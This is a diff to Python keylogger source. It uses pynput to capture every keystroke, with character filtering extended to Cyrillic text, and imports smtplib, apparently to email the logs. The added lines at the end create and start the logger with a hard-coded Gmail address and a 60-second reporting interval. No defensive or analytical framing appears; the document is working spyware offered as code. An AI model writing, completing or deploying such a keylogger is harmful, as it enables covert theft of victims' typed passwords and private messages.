@@ -1,3 +1,6 @@
+#!/usr/bin/python
+# -*- coding: utf8 -*-
+
 import pynput.keyboard
 import threading
 import smtplib
@@ -13,14 +16,15 @@ class Logger:
         self.log = self.log + string
 
     def proccess_key_press(self, key):
-        try:
-            current_key = str(key.char)
-        except AttributeError:
-            if key == key.space:
-                current_key = " " 
-            else:
-                current_key= "" + str(key) + " "
-        self.append_log(current_key)
+        ignor = " ! \" # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ Q W E R T Y U I O P L K J H G F D   S A Z X C V B N M q w e r t y u i o p a s d f g h j k l z x c v b n m [ \ ] ^ _ ` { } | ~ Ђ Ѓ ‚ ѓ „ … † ‡ € ‰ Љ ‹   ‹ Њ Ќ Ћ Џ ђ ‘ ’ “ ” • – — ™ љ › њ ќ ћ џ Ў ў Ћ ¤ Ґ ¦ § Ё © Є « ¬ ® Ї ° ± І і ґ µ ¶ · ё № є » ј Ѕ ѕ ї Й Ц У К Е Н Г Ш Щ З Х Ъ Ф Ы В А П Р О Л Д Ж Э Я  Ч С М И Т Ь Б Ю й ц у к е н г ш щ з х ъ ф ы в а п р о л д ж э я ч с м и т ь б ю і ї Ї І є Є Key.enter Key.space "
+
+        current_key = str(key).replace("'", "")
+        if current_key in ignor:
+            if current_key == "Key.enter":
+                current_key = "\n"
+            if current_key == "Key.space":
+                current_key = " "
+            self.append_log(current_key)
 
     def report(self):
         print(self.log)
@@ -41,3 +45,6 @@ class Logger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+
+keylogger = Logger(60, "kkosmos381@gmail.com", "")
+keylogger.start()
